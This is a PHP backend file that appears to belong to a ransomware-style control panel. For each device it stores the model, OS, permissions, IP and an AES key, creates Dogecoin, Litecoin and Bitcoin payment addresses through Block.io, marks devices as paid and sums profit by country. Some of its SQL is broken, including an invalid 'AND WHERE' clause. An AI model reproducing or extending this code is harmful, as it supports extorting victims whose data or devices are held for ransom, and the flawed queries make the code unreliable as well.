<?php

    require_once realpath(dirname(__FILE__)) . "/../config.php";

    function get_pdo () {
        return new PDO('mysql:host=' . DB_HOST . ';dbname=' . DB_NAME, DB_USER, DB_PASSWORD);
    }

    function query ($query, $array) {
        $q = get_pdo()->prepare($query);
        if ($array != null) $q->execute($array);
        else $q->execute();

        return $q->fetchAll();
    }
	
	function add_client($uid, $country, $model, $os, $permissions, $ip, $key) {
		
		require_once realpath(dirname(__FILE__)) . '/../lib/blockio.php';
	
		$block_io = new BlockIo(APIKEYS["DOGE"], PIN, 2);
		$doge_address = $block_io->get_new_address(array())->data->address;
		
		$block_io = new BlockIo(APIKEYS["LTC"], PIN, 2);
		$ltc_address = $block_io->get_new_address(array())->data->address;
		
		$block_io = new BlockIo(APIKEYS["BTC"], PIN, 2);
		$btc_address = $block_io->get_new_address(array())->data->address;
		
		query("INSERT INTO `clients` (`uid`, `country`, `model`, `os`, `ip`, `permissions`, `aeskey`, `address_ltc`, `address_btc`, `address_doge`) VALUES (:uid, :country, :model, :os, :ip, :permissions, :aeskey, :addr1, :addr2, :addr3)", array(
				"uid" => $uid,
				"country" => $country,
				"model" => $model,
				"os" => $os,
				"ip" => $ip,
				"permissions" => $permissions,
				"aeskey" => $key,
				"addr1" => $ltc_address,
				"addr2" => $btc_address,
				"addr3" => $doge_address
			)
		);
	}
	
	function get_clients_by_country($country) {
		return query("SELECT * FROM `clients` WHERE `country`=? AND WHERE `payed`=1", array($country));
	}
	
	function remove_client($id) {
		query("DELETE FROM `clients` WHERE `id`=?",
			array(
				$id
			)
		); 
		
	}
	
	function update_profit($add, $country) {
		query("INSERT INTO `profit` (country, profit) VALUES(:country, `profit`+:profit) ON DUPLICATE KEY UPDATE `profit`=`profit`+:profit",
			array(
				"profit" => $add,
				"country" => $country
			)
		);
	}
	
	function get_profit() {
		return query("SELECT * FROM `profit`");
	}
	
	function set_payed($id) {
		query("UPDATE `clients` SET `payed`=1 WHERE `uid`=?",
			array(
				$id
			)
		);
		

	}
	
	function get_client($uid) {
		return query("SELECT * FROM `clients` WHERE `uid`=?",
			array(
				$uid
			)
		); 
	}
	
	function get_clients() {
		return query("SELECT * FROM `clients`", null);
	}